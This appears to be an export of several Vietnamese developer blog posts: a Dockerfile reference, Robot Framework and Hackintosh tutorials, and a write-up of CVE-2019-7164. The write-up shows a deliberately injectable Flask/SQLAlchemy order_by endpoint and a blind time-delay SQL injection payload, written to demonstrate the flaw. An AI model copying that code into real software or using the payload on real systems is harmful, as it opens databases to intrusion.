Dockerfile.\n\n> **Warning**: Không dùng thư mục root, **/**, làm **PATH** vì nó sẽ khiến cho việc build sẽ chuyển toàn bộ nội dung của ổ đĩa đến Docker daemon.\nĐể có thể sử dụng file trong build context, Dockerfile cung cấp cho ta lệnh **COPY**. Để tăng tốc độ build thì ta có  thể loại trừ 1 số files hay directories bằng cách thêm file .dockerignore vào thư mục context.\n\nThường thường thì Dockerfile sẽ đặt tên đúng là Dockerfile và được đặt ở root của context. Bạn có thể sử dụng **-f** flag với docker build để chỉ đến Dockerfile ở bất kỳ đầu trong hệ thống.\n```\n$ docker build -f /path/to/a/Dockerfile .\n```\n\nBạn có thể chỉ định 1 repository và tag để lưu image mới được tạo nếu build thành công:\n```\n$ docker build -t shykes/myapp .\n```\nĐể tạo nhiều tag cho image ta có thể add nhiều **-t** flag khi chạy build command:\n```\n$ docker build -t shykes/myapp:1.0.2 -t shykes/myapp:latest .\n```\nTrước khi Docker daemon chạy theo lệnh trong Dockerfile, nó sẽ thực hiện 1 lần validate sơ bộ Dockerfile và trả ra lỗi nếu phát hiện bất kỳ lỗi syntax nào\n```\n$ docker build -t test/myapp .\nSending build context to Docker daemon 2.048 kB\nError response from daemon: Unknown instruction: RUNCMD\n```\n\nDocker daemon chạy các lệnh theo Dockerfile từng cái 1, commit kết quả lại theo từng phần đến image mới nếu có thể trước khi trả về ID của image mới được tạo. Docker daemon sẽ tự động clean up context đã gửi trước đó.\nLưu ý rằng mỗi lệnh được chạy độc lập với nhau cho nên nếu bạn có 1 đoạn lệnh **RUN cd /tmp** nó sẽ không có tác dụng đối với các lệnh sau.\nKhi có thể, Docker sẽ tái sử dụng các image có sẵn (cache), để tăng tốc quá trình docker build. Điều này được chỉ ra bởi dòng **Using cache** trong console output.\n```\n$ docker build -t svendowideit/ambassador .\nSending build context to Docker daemon 15.36 kB\nStep 1/4 : FROM alpine:3.2\n ---> 31f630c65071\nStep 2/4 : MAINTAINER SvenDowideit@home.org.au\n ---> Using cache\n ---> 2a1c91448f5f\nStep 3/4 : RUN apk update &&      apk add socat &&        rm -r /var/cache/\n ---> Using cache\n ---> 21ed6e7fbb73\nStep 4/4 : CMD env | grep _TCP= | (sed 's/.*_PORT_\\([0-9]*\\)_TCP=tcp:\\/\\/\\(.*\\):\\(.*\\)/socat -t 100000000 TCP4-LISTEN:\\1,fork,reuseaddr TCP4:\\2:\\3 \\&/' && echo wait) | sh\n ---> Using cache\n ---> 7ea8aef582cc\nSuccessfully built 7ea8aef582cc\n```\n\nBuild cache chỉ được sử dụng từ các image mà có mắt xích kết nối với nhau. Điều này đồng nghĩa với việc những images được tạo bởi các bản build trước hoặc các images được load bởi **docker load**. Nếu bạn muốn build cache của 1 image xác định thì bạn cần phải chỉ định nó với option **--cache-from**.\n\n# Format\nSau đây là format của Dockerfile:\n```\n# Comment\nINSTRUCTION arguments\n```\n\nCác lệnh (instruction) không phân biệt chữ hoa chữ thường. Tuy nhiên ta nên viết hoa INSTRUCTION để phân biệt nó với arguments.\nDocker chạy các lệnh trong Dockerfile theo thứ tự. Dockerfile **bắt buộc bắt đầu bằng FROM**. Lệnh **FROM** chỉ định Base Image bạn đang build là gì. Docker coi các dòng bắt đầu với **#** như 1 comment. Trừ khi dòng đó là 1 *parser directive*. **#** ở bất kì đâu trong dòng được coi như 1 đối số. Điều này cho phép statement dạng:\n```\n# Comment\nRUN echo 'we are running some # of cool things'\n```\n\nKý tự tiếp nối dòng không được hỗ trợ trong comments.\n# Parser directives\nParser directive là không bắt buộc, và có thể ảnh hưởng đến cách dòng tiếp theo trong Dockerfile được xử lý. Parser directive không thêm layers cho lệnh build và sẽ không được coi như là 1 build step. Parse directives được viết như 1 dạng đặc biệt của comment theo form **# directive=value**. 1 directive chỉ có thể được sử dụng 1 lần.\n1 khi đã comment, dòng trống hoặc các lệnh build đã được thực hiện,  Docker sẽ không quan tâm đến parser directives. Thay vào đó nó coi tất cả những thứ có dạng như parser directives là 1 comment và sẽ không đưa vào validate. Do đó, tất cả các parser directives phải được viết ở đầu Dockerfile.\nParser directives không phân biệt chữ hoa chữ thường. Tuy nhiên convention cho nó là chữ thường. Convention cũng bao gồm cả dòng trống theo sau bất kỳ parser directives nào. Ký tự tiếp nối dòng cũng không được hỗ trợ trong parser directives. Theo các quy tắc đó, các lệnh sau là sai:\n1.  Sai ký tự tiếp nối dòng\n```\n# direc \\\ntive=value\n```\n2.  Lỗi sai do khai báo 2 lần\n```\n# directive=value1\n# directive=value2\n\nFROM ImageName\n```\n3.  Coi như 1 comment do xuất hiện bên dưới các lệnh build\n```\nFROM ImageName\n# directive=value\n```\n4.  Coi như comment do xuất hiện sau 1 comment mà không phải parser directive\n```\n# About my dockerfile\n# directive=value\nFROM ImageName\n```\n5.  unknowndirective coi như 1 comment do docker không nhận ra được vì lỗi chính tả. Thêm vào đó, knowndirective cũng được coi như comment do xuất hiện sau 1 comment mà không phải parser directive\n```\n# unknowndirective=value\n# knowndirective=value\n```\n6.  Khoảng trắng phía trước là hợp lệ nên tất cả các dòng sau đều được coi là 1 parser directive giống nhau.\n```\n#directive=value\n# directive =value\n#\tdirective= value\n# directive = value\n#\t  dIrEcTiVe=value\n```\n7.  Những parser directive sau đây được hỗ trợ\n```\nsyntax\nescape\n```\n\n# Escape\n```\n# escape=\\ (backslash)\n```\nhoặc\n```\n# escape=` (backtick)\n```\nEscape directive quy định character được sử dụng làm escape characters trong Dockerfile. Nếu không được chỉ định thì mặc định sẽ là **\\ .**\nEscape character cho phép các lệnh Dockerfile được chia làm nhiều dòng. Lưu ý rằng mặc dù escape parser directive được thêm vào Dockerfile tuy nhiên escape sẽ không được thực hiện trong RUN command trừ khi nó ở cuối dòng.\nCài đặt escape character thành **\\`** rất hữu dụng trong Window khi mà \\ được coi là ký tự phân cách thư mục. Cân nhắc ví dụ sau sẽ fail trong 1 vài trường hợp nào đó ở WIndows. Dấu \\ ở dòng thứ 2 có thể được hiểu như 1 ký tự ngắt dòng mới thay vì hiểu rằng nó là 1 escape character cho ký tự \\. Tương tự, ký tự \\ ở cuối dòng 3 có  thể hiểu như ta sẽ viết dòng thứ 4 là nối tiếp của dòng thứ 3. Kết quả của dockerfile này sẽ là dòng thứ 2 và thứ 3 sẽ chỉ được coi như 1 lệnh đơn:\n```\nFROM microsoft/nanoserver\nCOPY testfile.txt c:\\\\\nRUN dir c:\\\n```\nTrả về:\n```\nPS C:\\John> docker build -t cmd .\nSending build context to Docker daemon 3.072 kB\nStep 1/2 : FROM microsoft/nanoserver\n ---> 22738ff49c6d\nStep 2/2 : COPY testfile.txt c:\\RUN dir c:\nGetFileAttributesEx c:RUN: The system cannot find the file specified.\nPS C:\\John>\n```\nBằng cách thêm escape parser directive là **\\`**, Dockerfile sẽ thành công trên Windows mà không gặp các vấn đề về ký tự phân chia PATH:\n```\n# escape=`\n\nFROM microsoft/nanoserver\nCOPY testfile.txt c:\\\nRUN dir c:\\\n```\nKết quả:\n```\nPS C:\\John> docker build -t succeeds --no-cache=true .\nSending build context to Docker daemon 3.072 kB\nStep 1/3 : FROM microsoft/nanoserver\n ---> 22738ff49c6d\nStep 2/3 : COPY testfile.txt c:\\\n ---> 96655de338de\nRemoving intermediate container 4db9acbb1682\nStep 3/3 : RUN dir c:\\\n ---> Running in a2c157f842f5\n Volume in drive C has no label.\n Volume Serial Number is 7E6D-E0F7\n\n Directory of c:\\\n\n10/05/2016  05:04 PM             1,894 License.txt\n10/05/2016  02:22 PM    <DIR>          Program Files\n10/05/2016  02:14 PM    <DIR>          Program Files (x86)\n10/28/2016  11:18 AM                62 testfile.txt\n10/28/2016  11:20 AM    <DIR>          Users\n10/28/2016  11:20 AM    <DIR>          Windows\n           2 File(s)          1,956 bytes\n           4 Dir(s)  21,259,096,064 bytes free\n ---> 01c7f3bef04f\nRemoving intermediate container a2c157f842f5\nSuccessfully built 01c7f3bef04f\nPS C:\\John>\n```\n# Environment replacement\nCác biến môi trường (được định nghĩa bởi lệnh ENV) có thể được sử dụng trong các lệnh nhất định dưới dạng các biến được Dockerfile diễn giải. Escape cũng được xử lý để chứa đựng các cú pháp dạng biến thành 1 câu lệnh theo nghĩa đen.\nCác biến môi trường được ký hiệu trong Dockerfile theo 2 cách: $variable_name hoặc ${variable_name}. Cú pháp ${variable_name} hỗ trợ 1 vài chuẩn sau:\n* ${variable:-word} chỉ ra rằng nếu variable được thiết lập rồi thì kết quả sẽ theo là giá trị đó còn nếu không thì word sẽ thay thế nó.\n* ${variable:+word} chỉ ra rằng nhếu variable được thiết lập rồi thì kết quả sẽ là theo word còn ngược lại kết quả sẽ là empty string.\nVD:\n```\nFROM busybox\nENV foo /bar\nWORKDIR ${foo}   # WORKDIR /bar\nADD . $foo       # ADD . /bar\nCOPY $foo /quux # COPY $foo /quux\n```\n\nBiến môi trường hỗ trợ 1 số lệnh sau trong Dockerfile:\n* ADD\n* COPY\n* ENV\n* EXPOSE\n* FROM\n* LABEL\n* STOPSIGNAL\n* USER\n* VOLUME\n* WORKDIR\n\n# .dockerignore file\nTrước khi docker CLI gửi context cho docker daemon, nó sẽ tìm kiếm file .dockerignore trong root directory của context. Nếu file này tồn tại thì CLI sẽ điều chỉnh để context loại các file/folder match với các patterns trong đó. Việc này sẽ giúp tránh việc gửi 1 lượng lớn dữ liệu không cần thiết hoặc các file chứa thông tin nhạy cảm :kissing_closed_eyes: Sau đó nếu muốn thêm 1 vài file cụ thể nào đó thì có thể dùng lệnh ADD hoặc COPY.\nVD về file .dockerignore\n```\n# comment\n*/temp*\n*/*/temp*\ntemp?\n```\nGiải thích 1 chút:\n\n\n| **Ký hiệu** | **Giải thích** |\n| -------- | -------- |\n| # comment     | Bỏ qua     | \n| \\*/temp\\*     | loại trừ các file và thư mục có tên bắt đầu bằng temp trong thư mục root  VD: /somedir/temp   | \n| \\*\\/\\*\\/temp\\*     | Loại trừ các file và thư mục có tên bắt đầu bằng temp từ các subdirectory có lvl bằng 2 tính từ root VD /somedir/subdir/tempaa.txt     | \n|  temp?    | Ngoại trừ các file và thư mục ở thư mục root có có tên dạng mở rộng của temp như /tempa hay /tempb      |\n\nDòng bắt đầu bằng **!** có thể được sử dụng như 1 ngoại lệ của việc ignore. Dưới đây là 1 VD:\n```\n    *.md\n    !README.md\n```\nTất cả các file .md sẽ bị loại bỏ ngoại trừ file README.md	Docker có thể build các images 1 cách tự động bằng các đọc các lệnh bên trong Dockerfile. Dockerfile là 1 file text chứa tất cả các command mà người dùng có thể sử dụng để xây dựng nên 1 image. Người dùng có thể sử dụng lệnh  để tự động thực hiện các command-line đã được viết trong Dockerfile.\nPhần này sẽ mô tả các command mà bạn có thể sử dụng trong Dockerfile.\n\nUsage\nDocker build command sử d...	{https://images.viblo.asia/a51947fd-05d1-4ef1-8b23-93aa1e23dc3f.jpg}	1	Dockerfile reference	{docker}	0	f	2022-12-18 15:33:38.511+00	2022-12-18 15:33:38.511+00
31852	`CVE-2019-7164: Lỗ hổng trong SQLALchemy (version 1.2.17 và 1.3.x đến 1.3.0b2) cho phép SQL injection thông qua tham số order_by.`\n\n## Lời mở đầu\n\nCâu chuyện nó không có gì thú vị lắm nếu như tối không ngồi rảnh tay bấm vào xem source code của từng project cũ tôi từng viết trên github.\n\nMột ngày trời mưa ( theo tôi thì Hà Nội nắng nóng lâu rồi nên hôm nào mưa chính là ngày đẹp trời ), tôi vào xem lại từng project đã từng viết trong github của mình và nhận được một `alert` từ github: `We found potential security vulnerabilities in your dependencies.` Rồi github cho mình tên là `CVE-2019-7164: Lỗ hổng trong SQLALchemy (version 1.2.17 and 1.3.x đến 1.3.0b2) cho phép SQL injection thông qua tham số order_by.`\n\nMình đã ngâm cứu CVE này rất kỹ, dựng lên mỗi trường và tìm cách khai thác và hôm nay mình viết lại cho các bạn đọc được biết cũng như không nên quá tin tưởng vào ORM nha.\n\nVì phạm vi viết về ORM rất là rộng, mỗi ngôn ngữ sẽ dùng 1 loại cho ngôn ngữ đó. Nên để ví dụ chi tiết, cụ thể thì mình tập trung đi vào làm ví dụ demo bằng `SQLALchemy` trong python.\n\n## Một số khái niệm sẽ gặp: ORM, SQLALchemy\n\n`Có rất nhiều bài viết nói về các khái niệm này trên mạng rồi, nhưng mình xin tóm lại cho bạn hiểu sơ qua.`\n\nORM là gì? ORM là tên viết tắt của cụm từ “Object Relational Mapping” đây là tên gọi chỉ việc ánh xạ các record dữ liệu trong hệ quản trị cơ sở dữ liệu sang dạng đối tượng mà mã nguồn đang định nghĩa trong class. Là một khái niệm phổ biến, được cài đặt trong tất cả các loại ngôn ngữ hiện đại ngày nay như: java, php, node.js, swift … Bạn dễ dàng có thể cài đặt ORM hoặc sử dụng các thư viện mã nguồn mở về ORM trong bất cứ dự án nào bạn thích. Vậy ORM đem lại ích lợi gì cho các lập trình viên.\n\n![ORM là gì](https://manhnv.com/images/posts/cve-2019-7164-sqlalchemy-dinh-loi-sqlinjection-thong-qua-tham-so-cua-orderby/orm-la-gi.png "ORM là gì")\n\nSQLALchemy là gì? SQLAlchemy là một công cụ mã nguồn mở của SQL và O R M , được phát hành theo giấy phép MIT. Nó được phát hành ban đầu vào tháng Hai năm 2006, và được viết bởi Michael Bayer. Nó cung cấp đầy đủ các phương thức, ở level cao, đảm bảo cho việc truy cập cơ sở dữ liệu hiệu suất cao, là một chuyển thể đơn giản của Pythonic language. , nó hoạt đông theo data mapper pattern ( như Hibernate trong Java), chứ không phải là record pattern như trong Ruby and Rails.\n\n## Xây dựng môi trường\n\n* Dùng framework flask của python\n* SQLALchemy version < 1.3.0 ( từ bản >=1.3.0 đã đã được cập nhật sử lỗi nhé)\n\n**file `requirements.txt`**:\n\n```txt\nFlask==1.1.1\nFlask-SQLAlchemy==2.3.2\nSQLAlchemy==1.2.14\nmysqlclient==1.4.2.post1\n```\n\n**File `app.py`**:\n\n```python\nimport os\nimport json\nfrom flask import Flask,request\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = Flask(__name__, instance_relative_config=True)\napp.config.from_mapping(\n    SECRET_KEY='manhnv.com',\n    SQLALCHEMY_TRACK_MODIFICATIONS=False,\n    SQLALCHEMY_DATABASE_URI='mysql+mysqldb://username:password@localhost:3306/cve_2019_7164',\n)\ndb = SQLAlchemy(app)\ndb.create_all()\n\nclass User(db.Model):\n    __tablename__ = 'user'\n\n    id = db.Column(db.String(20), primary_key=True)\n    username = db.Column(db.String(255))\n    created_at = db.Column(db.String(255))\n\n@app.route('/api/list')\ndef hello():\n    # Đoạn code sẽ bị sql injection\n    order_by = request.args.get('order_by')\n    result=User.query.order_by(order_by).all()\n\n    return json.dumps([row.username for row in result] or [])\n```\n\n* Đoạn code trên sẽ dùng SQLALchemy để truy vấn dữ liệu, và mình tạo ra một trang lấy list user và nhận tham số order_by từ param.\n\n![Run cve](https://manhnv.com/images/posts/cve-2019-7164-sqlalchemy-dinh-loi-sqlinjection-thong-qua-tham-so-cua-orderby/run-cve.png "Run cve")\n\n=> Như vậy môi trường đã dựng xong\n\n## Cách khai thác\n\n![Run cve](https://manhnv.com/images/posts/cve-2019-7164-sqlalchemy-dinh-loi-sqlinjection-thong-qua-tham-so-cua-orderby/run-cve2.png "Run cve")\n\n* Đáng lý ra nếu lọc hết đầu vào thì ở ảnh trên mình thêm ';' thì chắc chắn sẽ bị raise lỗi ra, nhưng lạ thay chương trình vẫn chạy, vì nó dính SQL injection mà.\n* Vậy tiếp theo mình thử một đoạn SQL injection khắc thử `username, (select sleep(10) from dual where database() like database())--` thì thấy trang web sẽ delay 10s mới trả về kết quả. Thì khẳng định luôn là có thể dùng SQL injection để khai thác triệt để qua tham số order_by này.\n\n## Điều muốn nói\n\n* Những thư viện ORM thật sự giúp ích cho lập trình viên rất nhiều, vì nó giúp cho lập trình viên tập trung vào phát triển ý tưởng mà không cần quan tâm câu lệnh truy vấn. Nhưng nếu lập trình viên quá phụ thuộc vào ORM mà không tìm hiểu kỹ nó hoạt động như thế nào, có những lỗi gì thì sẽ rất nguy hiểm cho project của bạn.\n* Nếu đã dùng ORM hay bất cứ thư viện nào trong project của bạn thì cũng nên kiểm tra cập nhật thường xuyên để đảm bảo rằng ORM vẫn hoạt động không lỗi nào.\n* Hãy nhớ, thư viện cũng là do lập trình viên tạo ra và chắc chắn sẽ không kiểm soát hết lỗi, nên đừng tin tưởng một cái gì đó quá.\n\nMyBlog: https://manhnv.com/2019/07/cve-2019-7164-sqlalchemy-dinh-loi-sqlinjection-thong-qua-tham-so-cua-orderby/	CVE-2019-7164: Lỗ hổng trong SQLALchemy (version 1.2.17 và 1.3.x đến 1.3.0b2) cho phép SQL injection thông qua tham số order_by.\n\nLời mở đầu\n\nCâu chuyện nó không có gì thú vị lắm nếu như tối không ngồi rảnh tay bấm vào xem source code của từng project cũ tôi từng viết trên github.\n\nMột ngày trời mưa ( theo tôi thì Hà Nội nắng nóng lâu rồi nên hôm nào mưa chính là ngày đẹp trời ), tôi vào xem lạ...	{}	1	CVE-2019-7164: Lỗ hổng trong SQLALchemy (version 1.2.17 và 1.3.x đến 1.3.0b2) cho phép SQL injection thông qua tham số order_by	{cve,blind-sql-injection,sql-injection,pentest-web}	0	f	2022-12-18 15:33:38.535+00	2022-12-18 15:33:38.535+00
31860	![](https://images.viblo.asia/464eda8a-2ef9-4ee6-a052-33981bc595b7.png)\n\n\n-----\n\n\nChào bạn, ồ mình biết bạn đấy. Cách đây 1 năm mình cũng giống như bạn bây giờ, rất máu học Swift nhưng không có Macbook và cũng rất muốn học cài Hackintosh nhưng lại chẳng có nguồn nào hướng dẫn bài bản và đầy đủ để học cả. Thật khó chịu phải không nào. Vậy thì đây, trong loạt series bài viết về Hackintosh này mình sẽ giúp các bạn thành thạo Hackintosh từ A chí Z. Đây sẽ là cú click sáng suốt nhất của bạn :laughing:\n\n### Bàn về khái niệm "Hackintosh"\n-----\n\n\n*"**Hackintosh**"* là thuật ngữ để chỉ việc cài đặt hệ điều hành Mac OS lên máy tính không phải do Apple sản xuất. Xuất hiện lần đầu tiên vào năm 2005, việc cài đặt Hackintosh lên PC được gọi là "**Hackintoshing**", còn lên Laptop được gọi là "**Hackbooks**".\n\nRõ ràng, khi mà muốn có 1 chiếc Macbook để code Swift nhưng tài chính eo hẹp thì Hackintosh thực sự là 1 sự lựa chọn tối ưu. Cứ tưởng tượng bạn phải bỏ ra vài chục triệu để sắm Macbook thì giờ đây bạn đã hoàn toàn có thể sở hữu hệ điều hành MacOS ngay trên chính chiếc PC/Laptop của mình và không mẩt một đồng nào.\n\nTất nhiên nói đi thì cũng phải nói lại, nếu bạn thực sự nghiêm túc với nghề thì hãy luôn tự nhủ đây chỉ là biện pháp tạm thời. Hãy tích cóp một khoản tiền rồi sắm một chiếc Macbook/iMac thật mà dùng nhé :muscle:\n\n### Một số lưu ý\n\n-----\n\n+ Hackintosh không phải tất cả mọi máy đều cài được (mình sẽ có một bài nói về vấn đề phần cứng phù hợp sắp tới)\n+ Hackintosh không mang lại trải nghiệm chơi game tốt, chủ yếu là phục vụ công việc. Nên nếu muốn kết hợp chơi game thì cài song song sẽ là 1 lựa chọn phù hợp.\n\n\n### Lời kết\n\n-----\nTrên đây là vài lời cho bài mở đầu loạt series về Hackintosh. Cảm ơn mọi người đã quan tâm !!!	![](https://images.viblo.asia/464eda8a-2ef9-4ee6-a052-33981bc595b7.png)\n\n\n\nChào bạn, ồ mình biết bạn đấy. Cách đây 1 năm mình cũng giống như bạn bây giờ, rất máu học Swift nhưng không có Macbook và cũng rất muốn học cài Hackintosh nhưng lại chẳng có nguồn nào hướng dẫn bài bản và đầy đủ để học cả. Thật khó chịu phải không nào. Vậy thì đây, trong loạt series bài viết về Hackintosh này mình sẽ giúp các bạn thành thạo Hackintosh từ A chí Z. Đây sẽ là cú click sáng suốt...	{https://images.viblo.asia/464eda8a-2ef9-4ee6-a052-33981bc595b7.png}	1	Introduction Hackintosh	{macos,intro}	0	f	2022-12-18 15:33:38.553+00	2022-12-18 15:33:38.553+00
31849	### Lesson 2.2: Khai báo hai số nguyên a=5; b=4; c=10 (c là biến global) và tính tổng ba số nguyên a, b, c\n\nViết đoạn code sau vào Notepad++\n\n```\n# Biến c=10 được khai báo như global như thế này ???\n*** Variables ***\n${c}                                     ${10}\n\n*** Test Cases ***\n# Lesson 2.1: Khai báo 2 số nguyên a=5; b=4 và tính tổng 2 số nguyên đó\nTC002.1-Lesson 2.1\n    ${a}                 Set Variable    ${5}\n    ${b}                 Set Variable    ${4}\n    ${c}                 Evaluate        ${a} + ${b}\n    Log To Console       Tổng 2 số nguyên: ${a} + ${b} là ${c}\n\n# Lesson 2.2: Khai báo 3 số nguyên a=5; b=4; c=10 và tính tổng 3 số nguyên đó\nTC002.2-Lesson 2.2\n    ${a}                 Set Variable    ${5}\n    ${b}                 Set Variable    ${4}\n    ${tong}              Evaluate        ${a}+${b}+${c}\n    Log To Console       Tổng 3 số nguyên: ${a} + ${b} + ${c} là ${tong}\n```\nSave file với tên **TC002-Variables.robot**. Hiện tại mình sẽ lưu vào thư mục tên là RF trên Desktop\n\n![](https://images.viblo.asia/cfe83dad-a5cd-4eba-93df-992d95ab180a.PNG)\n\n**Runcode:**\n\n* Step 1: mở command prompt\n* Step 2: gõ lệnh để cd đến thư mục RF (C:\\Users\\Dell>**cd Desktop\\RF** )\n* Step 3: gõ lệnh để thực thi file robot như sau C:\\Users\\Dell\\Desktop\\RF>**robot TC002-Variables.robot**\n\n**Sau khi chạy command line, output:**\n![](https://images.viblo.asia/5ed84c2c-aa4e-466a-b933-69325af56095.PNG)\nVới code trên biến c được khởi là 10, sau khi đi qua TC002.1-Lesson 2.1, biến c được gán bằng 9. Nhưng khi đi qua TC002.2-Lesson 2.2 biến c vẫn giữ nguyên như giá trị lúc khởi tạo bẳng 10. Vậy để  biến c như một biến global ta làm thế nào.\n```\n*** Variables ***\n${c}                                     ${10}\n\n*** Test Cases ***\n# Lesson 2.1: Khai báo 2 số nguyên a=5; b=4 và tính tổng 2 số nguyên đó\nTC002.1-Lesson 2.1\n    ${a}                 Set Variable    ${5}\n    ${b}                 Set Variable    ${4}\n    ${c}                 Evaluate        ${a} + ${b}\n    Set Global Variable                  ${c}\n    Log To Console       Tổng 2 số nguyên: ${a} + ${b} là ${c}\n\n# Lesson 2.2: Khai báo 3 số nguyên a=5; b=4; c=10 và tính tổng 3 số nguyên đó\nTC002.2-Lesson 2.2\n    ${a}                 Set Variable    ${5}\n    ${b}                 Set Variable    ${4}\n    ${tong}              Evaluate        ${a}+${b}+${c}\n    Log To Console       Tổng 3 số nguyên: ${a} + ${b} + ${c} là ${tong}\n```\nSave file với tên **TC002-Variables.robot**. Hiện tại mình sẽ lưu vào thư mục tên là RF trên Desktop\n\n![](https://images.viblo.asia/e1bd6a4d-f219-4cb4-b0db-1636fb666962.PNG)\n\n**Runcode:**\n\n* Step 1: mở command prompt\n* Step 2: gõ lệnh để cd đến thư mục RF (C:\\Users\\Dell>**cd Desktop\\RF** )\n* Step 3: gõ lệnh để thực thi file robot như sau C:\\Users\\Dell\\Desktop\\RF>**robot TC002-Variables.robot**\n\n**Sau khi chạy command line, output:**\n\n![](https://images.viblo.asia/4ab2c9c2-523f-4fdd-a23c-6fc80c736795.PNG)\n\nVới code trên biến c được khởi là 10, sau khi đi qua TC002.1-Lesson 2.1, biến c được gán bằng 9. Và khi đi qua TC002.2-Lesson 2.2 biến c vẫn giữ nguyên là 9. Như vậy để biến c có thể dùng như biến global, mình thêm vào dòng lệnh\n```\n    Set Global Variable                  ${c}\n```\n\nPhần tiếp theo mình sẽ chia sẻ List trong Robot Framework! Các bạn đóng góp ý kiến để mình viết tốt hơn nhé! Thân !	Lesson 2.2: Khai báo hai số nguyên a=5; b=4; c=10 (c là biến global) và tính tổng ba số nguyên a, b, c\n\nViết đoạn code sau vào Notepad++\n\nSave file với tên TC002-Variables.robot. Hiện tại mình sẽ lưu vào thư mục tên là RF trên Desktop\n\nRuncode:\n\n* Step 1: mở command prompt\n* Step 2: gõ lệnh để cd đến thư mục RF (C:\\Users\\Dell>cd Desktop\\RF )\n* Step 3: gõ lệnh để thực thi file robot như sau C:\\U...	{https://images.viblo.asia/cfe83dad-a5cd-4eba-93df-992d95ab180a.PNG,https://images.viblo.asia/5ed84c2c-aa4e-466a-b933-69325af56095.PNG,https://images.viblo.asia/e1bd6a4d-f219-4cb4-b0db-1636fb666962.PNG,https://images.viblo.asia/4ab2c9c2-523f-4fdd-a23c-6fc80c736795.PNG}	1	Robot Framework Cơ Bản - Phần 2.2 - Sử dụng biến global	{robot-framework,automation}	0	f	2022-12-18 15:33:38.583+00	2022-12-18 15:33:38.583+00
31901	Chào các bạn, Như đề cập trong phần tiêu đề thì trong bài viết này mình sẽ giới thiệu cho các bạn về các cách có thể tạo 1 chiếc USB cài đặt Hackintosh: Cụ thể về Hackintosh là gì các bạn có thể xem qua trong bài viết trước đó của mình [Giới thiệu về Hackintosh](https://viblo.asia/p/gioi-thieu-ve-hackintosh-1Je5EvnyKnL) :laughing:.\n\nVề tổng quan, chúng ta sẽ có 3 cách để có thể tạo được USB này:\n+ Cách 1: Bung file DMG đã làm tất cả mọi thứ từ A đến Z vào USB\n+ Cách 2: Sử dụng công cụ Unibeast của các kỹ sư trên trang [tonymacx86.com](https://www.tonymacx86.com/)\n+ Cách 3: Làm thủ công từ A đến Z (**Cách được khuyến khích sử dụng nhất**)\n\n**Lưu ý:** USB của các bạn nên từ 8GB+ nhé. \n\nCòn chờ gì nữa, Let's go !!! :muscle: :muscle: \n\n-----\n\n## Cách 1: Bung file DMG làm sẵn\n\nNếu trước đây các bạn từng đi cài win dạo thì chắc hẳn có biết đến kỹ thuật **"GHOST"** máy tính. Mọi dữ liệu về hệ điều hành hay dữ liệu nói chung sẽ được nén thành 1 file GHOST có đuôi .GHO như là 1 file backup . Và khi bạn bung file .GHO ra hay nôm na là giải nén ra ổ cứng của các bạn thì khi đó dữ liệu đã được backup trong file .GHO sẽ được ghi mới lên ổ cứng. Và trên MacOS, file .GHO đó tương tự chính là file **".DMG"**. Trên thị trường hiện nay có rất nhiều các kỹ sư, lập trình viên trên toàn thế giới đã làm sẵn cho chúng ta những bản backup này. \nNhưng nổi tiếng và uy tín nhất mà mình từng biết thì đó là **HackintoshZone** của **Niresh** - một anh chàng rất có tiếng trong giới Hackintosh.\n\nCụ thể địa chỉ các sản phẩm của Niresh có tại: [HackintoshZone](https://www.hackintoshzone.com/profile/1-niresh/content/?type=downloads_file&change_section=1)\n\n![](https://images.viblo.asia/a327e72b-e457-4c75-b88d-10b8c9e57d06.png)\n\n### 1. Tải file .DMG\n\nTrên trang này chúng ta có thể bắt gặp rất nhiều phiên bản MacOS đã được làm sẵn, chẳng hạn như trên hình mình sẽ chọn phiên bản Hackintosh Mojave - phiên bản cài đặt của MacOS Mojave 10.14. Các bạn sẽ tải về bản .zip như hình dưới \n\n![](https://images.viblo.asia/2f0b6130-e0b6-4c83-8dc5-d3bc3b594da1.png)\n\nGiải nén file .zip sẽ có 1 file tên "Niresh Mojave.torrent", Mở file này lên để tải về file "Niresh-Mojave.DMG"\n\n![](https://images.viblo.asia/b674bbe3-a42e-476c-a159-6d98f7501b9c.png)\n\n![](https://images.viblo.asia/5d716e84-f2a4-45e0-af12-13bd9d118aac.png)\n\n\n### 2. Tải công cụ tạo bộ cài và restore USB\n\nPhổ thông nhất chúng ta có thể sử dụng đó là công cụ **Transmac** cho windows. Hoặc bất cứ phần mềm nào cho phép ghi file .DMG lên USB.\nCác bạn có thể tải Transmac về theo địa chỉ sau: [Transmac](https://www.acutesystems.com/scrtm.htm)\n\nSau khi đã có transmac trên máy, các bạn mở lên, tiến hành format lại USB theo chuẩn định dạng HFS+ của Apple bằng cách chuột phải vào USB chọn "Format Disk For Mac".\n\n![](https://images.viblo.asia/9615d65c-5a61-4a55-9393-7467b6b27a80.png)\n\n![](https://images.viblo.asia/8022b5cd-2354-4dd6-904e-674f03b5b180.png)\n\nMột khi đã format thành công, tiếp theo chúng ta sẽ tiến hành ghi file .DMG lên USB bằng cách chuột phải vào USB chọn "Restore with Disk Image"\n\n![](https://images.viblo.asia/90017394-b2fd-4531-8dfb-e6315cfa7d54.png)\n\nCửa sổ hiện lên, các bạn chọn file .DMG vừa download được ở trên vào. Quá trình restore sẽ diễn ra, thời gian khoảng từ 20-25p tuỳ máy\n\n![](https://images.viblo.asia/b36a4c0a-28e5-4633-bd91-017d6ffae012.png)\n\nXong, vậy là theo cách 1 các bạn đã có thể tạo được 1 chiếc USB cài đặt Hackintosh siêu dễ ngay trên Windows, bây giờ bạn đã có thể cài đặt được ngay. Đặt BIOS phải boot chế độ UEFI nhé  !!\n\n![](https://images.viblo.asia/707dc6d8-80ca-44bd-ae1d-d9eaa62755d7.png)\n\n\n## Cách 2: Sử dụng công cụ Unibeast\n\nKhông giống với cách 1, từ cách 2 trở đi bạn bắt buộc phải có 1 máy đã chạy Hackintosh / 1 máy mac thật / hoặc ít nhất có 1 máy windows cài máy ảo MacOS. Tại sao ?? Bởi vì Unibeast là công cụ chỉ chaỵ trên hệ điều hành MacOS.\n\nĐể có thể cài máy áo chạy MacOS trên windows các bạn có thể dễ dàng tìm kiếm được kết quả trên Google. Chẳng hạn như bài hướng dẫn này: [Hackintosh Virtualbox](https://www.youtube.com/watch?v=76Vk6OSgoF4)\n\nOK, Vậy là bây giờ trường hợp là tối thiểu bạn đã có 1 máy chạy MacOS rồi nhé. Chúng ta tiếp tục.\n\n### 1. Tải bộ cài từ Apple\n\nTrước khi tải công cụ thì trước hết chúng ta cần có bộ cài chính thức từ Apple đã. Cái này các bạn có thể tải về trực tiếp từ App Store, file cài đặt sẽ có định dạng "Install macOS + tên_phiên_bản_macOS.app", 